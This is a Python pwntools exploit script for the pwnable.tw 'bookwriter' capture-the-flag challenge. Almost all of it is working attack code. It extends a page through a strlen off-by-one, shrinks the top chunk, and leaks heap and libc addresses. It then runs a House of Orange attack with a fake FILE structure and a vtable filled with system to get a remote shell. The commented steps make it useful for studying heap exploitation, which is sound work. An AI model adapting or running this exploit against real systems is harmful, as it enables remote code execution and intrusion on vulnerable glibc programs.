from enum import Enum
from pwn import *

libc = ELF("./libc.so.6", checksec=False)


class Menu(Enum):
    AddPage = 1
    ViewPage = 2
    EditPage = 3
    ShowInfo = 4
    Exit = 5


class App:
    def __init__(self, p: tube, author: bytes):
        self._p = p
        self._p.sendlineafter(b"Author :", author)

    def _select_menu(self, menu: Menu):
        self._p.sendlineafter(b"Your choice :", str(menu.value).encode())

    def add_page(self, size: int, content: bytes = None):
        self._select_menu(Menu.AddPage)
        self._p.sendlineafter(b"Size of page :", str(size).encode())
        if content is not None:
            self._p.sendafter(b"Content :", content)

    def view_page(self, index: int):
        self._select_menu(Menu.ViewPage)
        self._p.sendlineafter(b"Index of page :", str(index).encode())
        self._p.recvuntil(b"Content :\n", drop=True)
        return self._p.recvline(keepends=False)

    def edit_page(self, index: int, content: bytes):
        self._select_menu(Menu.EditPage)
        self._p.sendlineafter(b"Index of page :", str(index).encode())
        self._p.sendafter(b"Content:", content)

    def show_info(self, change_author: bool, new_author: bytes = None):
        self._select_menu(Menu.ShowInfo)
        self._p.recvuntil(b"Author : ", drop=True)
        author = self._p.recv(0x40)  # read 40 bytes
        leak = self._p.recvuntil(b"\nPage : ", drop=True)
        leak = u64(leak.ljust(8, b"\x00"))
        # self._p.interactive()
        page = int(self._p.recvline(keepends=False), 10)

        if change_author:
            self._p.sendlineafter(b"(yes:1 / no:0) ", b"1")
            self._p.sendlineafter(b"Author :", new_author)
        else:
            self._p.sendlineafter(b"(yes:1 / no:0) ", b"0")

        return author, leak, page


"""
Notes:
* NX enabled, so we can't execute code from the stack.
* Stack canaries are also enabled.
* FULL RELRO is enabled, therefore GOT overwrites are not possible.
* I've managed to leak the heap base, but couldn't (yet) leak libc base.
* I got a heap overflow but I don't know (yet) how to turn it into code execution.

This is going to be hard.
"""

PAGE_COUNT = 0x00602040
AUTHOR = 0x00602060
CONTENT_TABLE = 0x006020A0
SIZE_TABLE = 0x006020E0

TOP_CHUNK_ADDR = 0xEB65190
FIRST_PAGE_ADDR = 0xEB65000 + 16
LEN_TO_OVERWRITE = TOP_CHUNK_ADDR - FIRST_PAGE_ADDR

ATTACK_SUCCESS_FLAG = b"ABCDEFG"

DEBUG = "--debug" in sys.argv
REMOTE = "--remote" in sys.argv


def conn():
    if REMOTE:
        return remote("chall.pwnable.tw", 10304)

    return process("./bookwriter_patched")


def exploit():
    p = conn()
    app = App(p, b"K" * 64)
    app.add_page(24, b"A" * 24)

    # Extend size[0] to 27 by exploiting the usage of strlen() in `edit_page`.
    # strlen(page_table[0]) returns 27 because, right after the first page's user data,
    # the `size + flags` qword for the top chunk is located.
    # This allows an overflow of 3 bytes beyond the user data,
    # enabling control over the 3 most significant bits of top_chunk->size.
    app.edit_page(0, b"A" * 24)

    # Overwrite top chunk malloc_chunk->size to 0xfe1.
    # See https://github.com/shellphish/how2heap/blob/16a5bde259ca40b8fd4892b61533cb95c2809695/glibc_2.23/house_of_orange.c#L53.
    # This version of glibc allocated the top chunk with size 0x20fe0. We overwrite it to 0xfe0 | PREV_INUSE.
    app.edit_page(0, b"A" * 0x18 + b"\xe1\x0f\x00")

    # Leak heap base, g_author is right before content_table. content_table[0] contains the address return by malloc() for the first note.
    # The call to show_info() will trigger a call to scanf(), which allocates 0x1000 bytes. Since 0x1000 > current top chunk size
    # (which is overwritten to 0xfe1), sysmalloc() will be called and free the current top chunk, putting fd, bk pointers on the heap.
    # Those are located in a fixed offset from libc main_arena symbol. New pages will be allocated using the freed chunk, so we will also
    # be able to get a libc leak because addresses (fd, bk) relative to libc.sym.main_arena will be put there.
    _, first_note_data_addr, _ = app.show_info(change_author=False)
    heap_base = first_note_data_addr & 0xFFFFF000
    if heap_base % 0x1000 != 0:
        error("wrong heap base")

    info(f"First note data ptr: {first_note_data_addr:#x}")
    info(f"Heap base: {heap_base:#x}")

    pb = log.progress("Triggering heap overflow", status="0%")

    # overwrite size of page 0 to 0.
    # We want content_table[8] to be NULL, and content_table[8] is effectively size_table[0],
    # Therefore we set the size of the first page to 0. malloc(0) will return a small allocation.
    app.edit_page(0, b"\x00")

    # Exploit the off-by-one mistake to overwrite first page size to a HUGE value (actually, to a pointer returned by malloc()).
    # This opens the door to a heap overflow, which makes it possible to do the House Of Orange attack.
    for i in range(1, 9):
        app.add_page(0x40, b"A" * 8)
        pb.status(f"{i*100/8:.2f}%")

    pb.success()

    # Becuase we overwrote the top chunk size to a smaller one, the next call to scanf() [which calls malloc(0x1000)]
    # frees the top chunk, and it then will be used for the new allocated pages. Meaning that we will be able to leak top_chunk->fd pointer
    # from the heap using `view_page` API.
    libc_leak = app.view_page(2)[8:]
    libc_leak = u64(libc_leak.ljust(8, b"\x00"))
    libc.address = libc_leak - (libc.sym["main_arena"] + 88)
    if libc.address % 0x1000 != 0:
        error("wrong libc base")

    info(f"Libc base: {libc.address:#x}")

    NULL = 0x006020E0 + 80  # .bss unused

    # Took this values from a debug session, just to take the offset to the top chunk from the first note chunk,
    # which we have heap overflow from.
    FIRST_CHUNK_DATA = 0x147C8000 + 16
    TOP_CHUNK_ADDR = 0x147C82A0

    OFFSET_TO_TOP_CHUNK = TOP_CHUNK_ADDR - FIRST_CHUNK_DATA
    context.clear(arch="amd64")
    fake_file = FileStructure(null=NULL)

    # We position the fake vtable immediately after the fake file. While a real vtable typically contains 24 entries,
    # we're only interested in the fourth entry, _IO_OVERFLOW. As a result, we create a vtable with just 4 entries,
    # reducing the size of the payload sent to the server.
    fake_vtable = p64(libc.sym.system) * 4
    vtable_addr = first_note_data_addr + OFFSET_TO_TOP_CHUNK + len(bytes(fake_file))
    orange = fake_file.orange(io_list_all=libc.sym._IO_list_all, vtable=vtable_addr)

    # Exploit the heap overflow:
    # 1. Clear memory from content_table up to the top chunk. This ensures that size[0] == content[8] == NULL,
    #    allowing us to allocate page number 8 using malloc.
    # 2. Overwrite the top chunk with the House of Orange attack payload and the fake vtable.
    app.edit_page(
        index=0,
        content=b"\x00" * OFFSET_TO_TOP_CHUNK + orange + fake_vtable,
    )

    # Trigger house of orange, this will spawn a shell.
    info("Triggering house of orange...")
    app.add_page(0x10, None)

    try:
        p.sendline(f"echo {ATTACK_SUCCESS_FLAG}".encode())
        success = ATTACK_SUCCESS_FLAG in p.recvuntil(ATTACK_SUCCESS_FLAG, timeout=5)
        if not success:
            error("Timeout. Exploit failed.")

        info("Attack succeeded!")
        p.clean()
        p.interactive()
    except EOFError:
        error("Exploit failed, server probably crashed.")


def main():
    exploit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        info("Attack aborted. Exiting...")
        exit()
